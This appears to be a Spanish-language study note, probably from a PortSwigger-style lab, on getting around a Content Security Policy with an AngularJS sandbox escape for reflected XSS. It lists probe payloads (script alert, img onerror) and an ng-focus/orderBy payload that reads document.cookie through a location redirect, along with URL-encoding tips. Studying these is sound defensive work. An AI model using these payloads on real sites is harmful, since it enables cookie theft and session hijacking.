# Escape de sandbox Angular JS sin cadenas 

Tags: #XSS #XSS-Reflected #AngularJS 

* [Angular Portswigger Cheatsheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet)

```javascript 
// CSP (Content Security Policy) es una función de seguridad que ayuda a evitar atques de secuencias de comandos entre sitios (XSS). 

// La cabecera HTTP CSP en la respuesta permire a los administradores de un sitio web controlar los recursos que el User-Agent puede cargar a una pagina. 

	default-src 'self' -> Solo permite cargar recursos del mismo origen por defecto
	script-src 'self' -> Permite scripts del mismo dominio | No permite scripts inline (<script>alert(0)</script>) | No permite eval()
	style-src 'unsafe-inline' 'self' -> Permite estilos inline y del mismo dominio 
```

```javascript 
- Verificar si el campo es inyectable:

	<script>alert(0)</script>
	<h1>Hi</h1>
	<marquee>Hi</marquee>
	<img src=0 onerror=alert(0)>
```

```javascript 
	<input ng-focus=$event.composedPath()|orderBy:'(z=alert)(1)'>


	<script>
		location='htpps://web.com/?search=<input id=x ng-focus=$event.composedPath()|orderBy:'(z=alert)(document.cookie)'>#x';
	</script>


Notas:
	1. Cuando se coloca '#' estas obligando a ir directamente al último elemento cuyo identificador es 'x'
	2. Para los espacios es bueno colocarlos con '+' o '%20'
	3. Urlencodear las comillas simples ' = '%27'
```